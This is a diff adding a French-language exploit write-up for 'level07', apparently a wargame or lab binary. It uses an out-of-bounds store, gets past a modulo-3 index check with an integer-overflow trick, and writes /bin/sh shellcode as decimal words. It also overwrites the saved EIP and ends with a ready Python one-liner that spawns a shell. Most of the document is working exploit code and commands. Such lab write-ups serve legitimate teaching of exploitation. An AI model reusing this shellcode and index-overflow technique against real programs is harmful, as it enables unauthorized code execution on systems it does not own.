@@ -1,0 +1,55 @@
+# Apres analyze du code on voit que on peut ecrire ou on veut a partir du buffer, cependant on ne peut pas ecrire la valeur de eip sur la stack car c'est sur l'offset 114,
+# et que le modulo 3 empeche d'y ecrire.
+#
+# Ainsi on voit dans le code que au moment du store du nombre il y a un left bitshift de 2. grace a ca on va pouvoir ecrire au valeur du modulo 3.
+# Il suffit de rajouter un 1 sur le bit 32, le shit va du coup l'enlever et donner notre valeur shouaite.
+#
+# On commence par generer notre shellcode a inserer en decimal, ainsi que leurs offset dans le buffer
+
+# Shellcode classique "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+# Notre ligne reverse: "\x68\x50\xc0\x31" "\x68\x73\x2f\x2f" "\x69\x62\x2f\x68" "\x50\xe3\x89\x6e" "\x89\x53\xe2\x89" "\xcd\x0b\xb0\xe1" "\x00\x00\x00\x80"
+# Notre ligne decimal: "1750122545" "1752379183" "1768042344" "1357089134" "2303976073" "3440095457" "128"
+#
+# Ligne avec offset:
+# 
+# "1750122545" -> 1
+# "1752379183" -> 2
+# "1768042344" -> 2147483651
+# "1357089134" -> 4
+# "2303976073" -> 5
+# "3440095457" -> 2147483654
+# "128" -> 7
+#
+# 0xf7e45513 > eip
+# 0xffffd6fc > adresse de la stack ou est eip
+#
+# 0xffffd534 > debut du buffer
+# 0xffffd538 > adresse du debut du shellcode (buffer + 4 bytes)
+# 4294956344 en decimal
+# 
+# l'offset du buffer pour changer eip sur la stack est 114, 2147483762 pour la commande
+#
+# Le programe segfault si on essaye de le lancer comme ca, en faite il y a un decalage de notre stack quand on lance avec gdb ou sans.
+# On va donc chercher ce decalage en lisant un endroit de la stack qui contient une adresse de la stack
+
+gdb ./level7
+> run
+read 116 // argv
+Number at data[116] is 4294956948
+# donc 0xFFFFD794
+#
+./level7
+> read 116
+Number at data[116] is 4294956996
+# Donc 0xFFFFD7C4
+# On fait la soustraction et on obtient 48
+
+# Ainsi notre buffer adresse de shellcode qui etait a 0xffffd538 devient 0xFFFFD568/4294956392
+#
+# On ecrit notre ligne 
+
+python -c "print('store\n4294956392\n2147483762\n' + 'store\n1750122545\n1\n' + 'store\n1752379183\n2\n' + 'store\n1768042344\n2147483651\n' + 'store\n1357089134\n4\n' + 'store\n2303976073\n5\n' + 'store\n3440095457\n2147483654\n' + 'store\n128\n7\n' + 'quit\n')" > /tmp/a ; cat /tmp/a - | ./level07
+
+# On commence par changer notre eip,
+# puis on ecrit tout notre shellcode
+
